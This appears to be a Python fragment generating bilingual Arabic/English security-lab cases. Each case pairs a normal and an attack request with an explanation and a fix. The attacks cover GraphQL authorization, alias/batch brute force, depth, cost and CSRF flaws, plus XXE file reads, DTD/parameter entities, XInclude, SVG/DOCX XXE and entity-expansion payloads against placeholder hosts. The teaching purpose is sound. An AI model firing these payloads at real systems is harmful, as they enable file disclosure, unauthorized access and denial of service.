G=[
 ('field','حقل حساس داخل كائن مسموح','Sensitive nested field','{ me { id email } }','{ me { id recovery_code } }','صلاحية قراءة me لا تعني السماح بكل حقل فيه.','Permission to read me does not authorize every nested field.','افرض صلاحية الحقل الحساس داخل الـresolver.','Enforce sensitive-field authorization in its resolver.'),
 ('node','تجاوز الملكية عبر node','Ownership bypass through node','{ node(id:"doc-alice") { id owner content } }','{ node(id:"doc-bob") { id owner content } }','المسار node يسترجع معرفاً دون تحقق ملكيته.','The node resolver loads an ID without checking ownership.','تحقق من ملكية المورد حتى في مسارات الاسترجاع العامة.','Check ownership even in generic retrieval resolvers.'),
 ('tenant','علاقة تكشف مؤسسة أخرى','Cross-tenant nested relation','{ tenant(id:"north") { id documents { id owner content } } }','{ tenant(id:"south") { id documents { id owner content } } }','علاقة المؤسسة تسمح بمعرف مؤسسة خارج جلسة Alice.','A tenant relationship accepts an organization outside Alice’s session.','طبّق حدود المؤسسة عند كل علاقة واستعلام.','Enforce tenant boundaries at every relationship and query.'),
 ('mutation','Mutation تعدل مورد الغير','Unauthorized document mutation','mutation { renameDocument(id:"doc-alice",title:"My title") { id title } }','mutation { renameDocument(id:"doc-bob",title:"Changed") { id title } }','التعديل يصل للسجل دون صلاحية على المستند المستهدف.','A mutation reaches storage without permission on its target document.','افرض صلاحية العملية والمورد قبل التعديل.','Authorize both operation and target before mutation.'),
 ('aliases','Aliases تتجاوز عدّاد العملية','Aliases bypass an operation counter','{ one:login(password:"wrong") { authenticated checked attempt status } }','{ a:login(password:"wrong") { authenticated checked attempt status } b:login(password:"wrong") { authenticated checked attempt status } c:login(password:"wrong") { authenticated checked attempt status } d:login(password:"wrong") { authenticated checked attempt status } }','يُحتسب طلب HTTP واحد رغم تنفيذ أربع محاولات تحقق.','One HTTP request is counted despite four verification attempts.','احتسب كل عملية حساسة لا عدد رسائل HTTP فقط.','Count each sensitive operation, not just HTTP envelopes.'),
 ('batch','تجميع عمليات يتجاوز الميزانية','Batch bypasses verification budget',None,None,'تُصفّر الميزانية عند كل عملية داخل batch نفسه.','The budget resets for each operation in the same batch.','اجمع كلفة العمليات تحت هوية واحدة وحدود مشتركة.','Aggregate operations under one identity and shared budget.'),
 ('depth','عمق استعلام غير مضبوط','Unbounded query depth','{ me { id } }','{ me { manager { manager { manager { manager { manager { id } } } } } } }','تتبع العلاقات المتكررة يولد عملاً أعمق من الحد المسموح.','Repeated relations create work beyond the permitted depth.','افحص عمق AST قبل تشغيل الـresolvers.','Check AST depth before running resolvers.'),
 ('cost','Pagination تتجاوز كلفة التنفيذ','Pagination exceeds query budget','{ documents(first:2) { id owner } }','{ documents(first:100) { id owner } }','حقل first الكبير يضاعف العمل دون ميزانية كلية.','A large first argument multiplies work without an overall budget.','احسب الكلفة قبل التنفيذ وافرض حدود صفحات مناسبة.','Calculate cost before execution and bound pagination.'),
 ('csrf','Mutation عبر طلب غير موثوق','Cross-site GraphQL mutation','mutation { updateNote(note:"My note") { note } }','mutation { updateNote(note:"Changed") { note } }','تغيير الملاحظة يُقبل من أصل خارجي وبطريقة GET في النموذج.','A note-changing mutation accepts a foreign origin and GET in the model.','ارفض GET لتغيير الحالة وطبّق تحقق CSRF مناسباً للجلسات.','Reject state-changing GET and enforce appropriate session-bound CSRF checks.'),
 ('schema','اكتشاف عملية إدارية بلا صلاحية','Discovered admin mutation lacks authorization','{ __schema { queryType { fields { name } } } }','{ __schema { queryType { fields { name } } } adminExport { secret } }','المشكلة غياب صلاحية adminExport؛ introspection وحدها ليست الثغرة.','The flaw is missing authorization on adminExport, not introspection by itself.','اسمح بالمخطط حسب السياسة وافرض صلاحية العملية الإدارية.','Expose schema as appropriate but authorize administrative operations.')]
for suffix,ar,en,n,a,ca,ce,fa,fe in G:
 if suffix=='batch':normal={'queries':['{ a:login(password:"wrong") { authenticated checked attempt status } }']};attack={'queries':['{ a:login(password:"wrong") { authenticated checked attempt status } }']*4}
 else:normal={'query':n};attack={'query':a}
 if suffix=='csrf':normal.update(method='POST',origin='https://academy.test');attack.update(method='GET',origin='https://untrusted.test')
 add('graphql',suffix,ar,en,normal,attack,ca,ce,fa,fe,'return resolve_without_authorization_or_budget(ast)','validate_operation_budget(ast)\nresolve_each_field_with_authorization(ast)',403 if suffix=='csrf' else 200)

X=[
 ('file','قراءة ملف عبر كيان خارجي','External entity reads a fixture file','<!DOCTYPE root [<!ENTITY sample SYSTEM "file:///fixtures/secret.txt">]><root>&sample;</root>','يحل المحلّل كياناً خارجياً من مصدر المستخدم ويعيد محتواه.','The parser resolves a user-defined external entity and returns its content.','عطّل DTD والكيانات الخارجية قبل التحليل.','Disable DTD and external entities before parsing.'),
 ('internal','XXE يصل لمورد داخلي','XXE reads an internal fixture','<!DOCTYPE root [<!ENTITY sample SYSTEM "https://internal.test/profile">]><root>&sample;</root>','يسمح حل الكيان بالوصول إلى مورد داخلي في خريطة المختبر.','Entity resolution reaches an internal resource in the fixture map.','امنع حل الموارد الخارجية من مدخل XML غير موثوق.','Prevent external resource resolution from untrusted XML.'),
 ('dtd','تحميل DTD خارجي','External DTD loading','<!DOCTYPE root SYSTEM "https://dtd.test/entity.dtd"><root>&sample;</root>','يستورد المحلّل تعريفات كيانات من DTD غير موثوق.','The parser imports entity declarations from an untrusted external DTD.','عطّل تحميل DTD الخارجي ولا تفوض المدخل لتحديد محلّل الموارد.','Disable external DTD loading and do not let input control resource resolution.'),
 ('parameter','Parameter Entity تستورد تعريفاً','Parameter entity imports declarations','<!DOCTYPE root [<!ENTITY % remote SYSTEM "https://dtd.test/entity.dtd">%remote;]><root>&sample;</root>','تستورد parameter entity تعريفاً يؤدي لقراءة ملف العينة.','A parameter entity imports a declaration that reads the fixture file.','عطّل parameter entities وDTD بدلاً من حجب اسم كيان واحد.','Disable parameter entities and DTD rather than filtering one entity name.'),
 ('blind','حل كيان دون إرجاع المحتوى','Blind entity resolution','<!DOCTYPE root [<!ENTITY sample SYSTEM "https://callback.test/ping">]><root>&sample;</root>','لا يظهر المحتوى في النص المعاد لكن سجل المحلّل يكشف طلب المورد الوهمي.','Output hides the content but the resolver log records the fixture request.','امنع الحل الخارجي ولا تعتمد على عدم ظهور النص كحماية.','Block external resolution; absent reflected text is not a defense.'),
 ('error','تسريب محتوى عبر تشخيص خطأ','Expanded data leaks through diagnostics','<!DOCTYPE root [<!ENTITY sample SYSTEM "file:///fixtures/secret.txt">]><root>&sample;<broken></root>','رسالة التشخيص تعرض مقتطفاً من XML بعد توسيع السر.','Diagnostics include an excerpt of XML after the secret was expanded.','عطّل الكيانات وارجع خطأ عاماً دون محتوى موسّع.','Disable entities and return a generic error without expanded content.'),
 ('xinclude','قراءة مورد عبر XInclude','XInclude reads a fixture resource','<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///fixtures/secret.txt" parse="text"/></root>','المعالجة اللاحقة تنفذ XInclude حتى دون DOCTYPE.','Post-processing resolves XInclude even without a DOCTYPE.','عطّل XInclude صراحة في مسار معالجة المدخلات.','Explicitly disable XInclude in the input pipeline.'),
 ('svg','كيان خارجي داخل SVG','External entity inside SVG','<!DOCTYPE svg [<!ENTITY sample SYSTEM "file:///fixtures/secret.txt">]><svg xmlns="http://www.w3.org/2000/svg"><text>&sample;</text></svg>','يعامل مستورد SVG ملف الصورة كـXML يسمح بالكيانات.','The SVG importer parses the image as XML with external entities enabled.','استخدم سياسة XML آمنة عند تحليل SVG؛ الامتداد لا يكفي.','Use a safe XML policy for SVG; the extension is insufficient.'),
 ('docx','كيان داخل XML مستند مضغوط','XXE inside a DOCX XML entry','<!DOCTYPE document [<!ENTITY sample SYSTEM "file:///fixtures/secret.txt">]><document><text>&sample;</text></document>','فك ZIP لا يحمي تحليل word/document.xml الذي يأتي بعده.','Unpacking ZIP does not secure subsequent word/document.xml parsing.','طبّق سياسة XML الآمنة داخل ملفات الحاوية أيضاً.','Apply safe XML policy inside archive containers too.'),
 ('expansion','توسع كيانات يتجاوز ميزانية المعالجة','Entity expansion exceeds a processing budget','<!DOCTYPE root [<!ENTITY a "'+('x'*20)+'"><!ENTITY b "'+('&a;'*10)+'"><!ENTITY c "'+('&b;'*10)+'">]><root>&c;</root>','كيانات داخلية متداخلة تضاعف حجم العمل حتى دون شبكة أو ملف خارجي.','Nested internal entities amplify processing even without a network or external file.','عطّل DTD غير الضروري وافرض ميزانيات حجم وعمق وزمن.','Disable unnecessary DTD and enforce size, depth and time budgets.')]
for suffix,ar,en,attack,ca,ce,fa,fe in X:
 normal='<root><message>Hello</message></root>'
 if suffix=='svg':normal='<svg xmlns="http://www.w3.org/2000/svg"><text>Hello</text></svg>'
 if suffix=='docx':normal='<document><text>Hello</text></document>'
 add('xml',suffix,ar,en,{'xml':normal},{'xml':attack},ca,ce,fa,fe,'document = parse_with_input_defined_entities(xml)','reject_dtd_entities_and_xinclude(xml)\ndocument = parse_without_external_resolution(xml)',400)

